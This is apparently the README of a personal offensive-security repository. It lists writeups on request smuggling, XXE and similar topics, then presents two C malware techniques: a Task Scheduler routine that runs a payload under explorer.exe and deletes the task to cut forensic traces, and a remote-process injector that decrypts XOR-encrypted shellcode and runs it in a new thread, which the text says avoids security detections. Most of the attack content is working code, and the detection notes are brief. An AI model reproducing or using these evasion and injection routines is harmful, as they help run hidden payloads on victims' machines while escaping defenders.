# Offensive Security Writeups by Samir  

This repository contains various writeups and research documents on offensive security topics, including web vulnerabilities, injection techniques, and memory exploitation. These documents are continuously updated with new research and insights.  

## 📜 Available Writeups  

1. [How CL.TE Request Smuggling Works](./How%20CL.TE%20Request%20Smuggling%20Works.pdf) – Explanation of CL.TE request smuggling attacks and their impact.  
2. [ORM Injection](./ORM%20Injection.pdf) – A deep dive into Object-Relational Mapping (ORM) injection techniques.  
3. [Vulnerabilities](./Vulnerbilities.pdf) – General overview of common security vulnerabilities and their exploitation.  
4. [Why and How Other Users' Requests Are Intercepted](./Why%20and%20How%20Other%20Users%27%20Requests%20Are%20Intercepted.pdf) – Research on request interception and session hijacking.  
5. [XXE Injection](./XXE%20Injection.pdf) – A breakdown of XML External Entity (XXE) attacks and mitigation techniques.
6. [Exploiting Race Condition](./EXPLOITING%20RACE%20CONDITION.pdf) - race condition occurs when multiple threads or processes access shared resources simultaneously in an unsynchronized manner, leading to unpredictable behavior or security vulnerabilities.


## 💀 **Malware Development – Parent PID Spoofing via Task Scheduler**

### 🔍 **Technique Explanation**
This technique abuses **Windows Task Scheduler** to create a scheduled task that runs a **malicious payload** while spoofing the **Parent Process ID (PPID)**. This allows malware to execute under a **legitimate process**, such as `explorer.exe`, making it harder to detect.

### 🚀 **How It Works:**
1. **Task Scheduler Object Creation**
   - Initializes the **COM Library**.
   - Retrieves the **Task Scheduler** object.

2. **Creating a Task**
   - A new scheduled task named `ExecME` is created.
   - The task is set to execute `explorer.exe` (which can be modified to run a payload).
   - Parameters and flags are configured for execution.

3. **Saving & Executing the Task**
   - The task is saved to disk and immediately executed.
   - This **bypasses process monitoring tools**, as the malicious process inherits the **legitimate PPID** of `explorer.exe`.

4. **Cleanup & Evasion**
   - The script **deletes the task** after execution, reducing forensic traces.

### 🛡 **Detection & Mitigation:**
✔ Monitor **Windows Event Logs** (Event ID 4698 – Scheduled Task Creation).
✔ Restrict **Task Scheduler permissions** to prevent unauthorized task creation.
✔ Use **behavior-based detection** for suspicious scheduled tasks.

---

## 📝 **Code: Parent PID Spoofing using Task Scheduler**

```c
int spoof_ppid_with_scheduler() {
    HRESULT hr = S_OK;
    ITaskScheduler *pITS;

    // Initialize COM library
    hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        printf("[!] Failed to initialize COM library. Error code = 0x%x\n", hr);
        return -1;
    }

    // Get Task Scheduler object
    hr = CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void **)&pITS);
    if (FAILED(hr)) {
        printf("[!] Failed to get Task Scheduler object. Error code = 0x%x\n", hr);
        CoUninitialize();
        return -1;
    }

    LPCWSTR pwszTaskName = L"ExecME";
    ITask *pITask;
    IPersistFile *pIPersistFile;

    // Create new task
    hr = pITS->NewWorkItem(pwszTaskName, CLSID_CTask, IID_ITask, (IUnknown**)&pITask);
    if (FAILED(hr)) {
        printf("[!] Failed creating new task. Error code = 0x%x\n", hr);
        pITS->Release();
        CoUninitialize();
        return -1;
    }

    // Set task parameters
    pITask->SetComment(L"Executing payload");
    pITask->SetApplicationName(L"C:\\Windows\\System32\\explorer.exe");
    pITask->SetWorkingDirectory(L"C:\\Windows\\System32");
    pITask->SetParameters(L"payload_parameters_here");
    pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);

    // Save the task
    hr = pITask->QueryInterface(IID_IPersistFile, (void **)&pIPersistFile);
    if (FAILED(hr)) {
        printf("[!] Failed saving task. Error code = 0x%x\n", hr);
        pITask->Release();
        pITS->Release();
        CoUninitialize();
        return -1;
    }

    hr = pIPersistFile->Save(NULL, TRUE);
    pIPersistFile->Release();
    if (FAILED(hr)) {
        printf("[!] Failed saving task to disk. Error code = 0x%x\n", hr);
        pITask->Release();
        pITS->Release();
        CoUninitialize();
        return -1;
    }

    // Run the task
    hr = pITask->Run();
    pITask->Release();
    if (FAILED(hr)) {
        printf("[!] Failed to run task. Error code = 0x%x\n", hr);
        pITS->Release();
        CoUninitialize();
        return -1;
    }

    // Clean up
    pITS->Delete(pwszTaskName);
    pITS->Release();
    CoUninitialize();

    printf("[+] Task Scheduler spoofing successful.\n");
    return 0;
}
```

---

## 🏴 **Upcoming Research & Updates**
✔ New techniques in **malware evasion**.
✔ More **offensive security writeups**.
✔ Research on **custom payload execution**.
✔ Advanced **Windows & Linux attack techniques**.
### Injecting Shellcode into a Remote Process

```c
int inject_shellcode(HANDLE processHandle) {
    PVOID remoteBuf;
    SIZE_T allocSize = encrypted_shellcode_len;

    // Allocate memory in the target process
    NTSTATUS status = NtAllocateVirtualMemory(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[!] Failed to allocate memory in target process.\n");
        return -1;
    }

    // Decrypt shellcode
    unsigned char decrypted_shellcode[sizeof(encrypted_shellcode)];
    unsigned char expanded_key[EXPANDED_KEY_LEN];
    expand_key(key, strlen(key), expanded_key, EXPANDED_KEY_LEN);
    memcpy(decrypted_shellcode, encrypted_shellcode, sizeof(encrypted_shellcode));
    xor_decrypt(decrypted_shellcode, sizeof(encrypted_shellcode), expanded_key, EXPANDED_KEY_LEN, iv, IV_LEN);

    // Write memory
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(processHandle, remoteBuf, decrypted_shellcode, sizeof(decrypted_shellcode), &bytesWritten);
    if (!NT_SUCCESS(status)) {
        printf("[!] Failed to write memory in target process.\n");
        return -1;
    }

    // Execute shellcode
    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, 0, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[!] Failed to create thread in target process.\n");
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

**Explanation:** This function injects and executes shellcode inside a remote process:

1. **Allocate Memory in Target Process:** Uses `NtAllocateVirtualMemory` to reserve memory in the target process.
2. **Decrypt Shellcode:** The encrypted shellcode is decrypted using XOR-based decryption with an expanded key.
3. **Write Decrypted Shellcode to Target Process:** The `NtWriteVirtualMemory` function writes the shellcode into the allocated memory.
4. **Execute Shellcode in a New Thread:** `NtCreateThreadEx` is used to create a remote thread inside the target process, executing the shellcode.
5. **Wait for Execution Completion:** `WaitForSingleObject` ensures the execution is completed before returning.

This method enables process injection while avoiding common security detections.
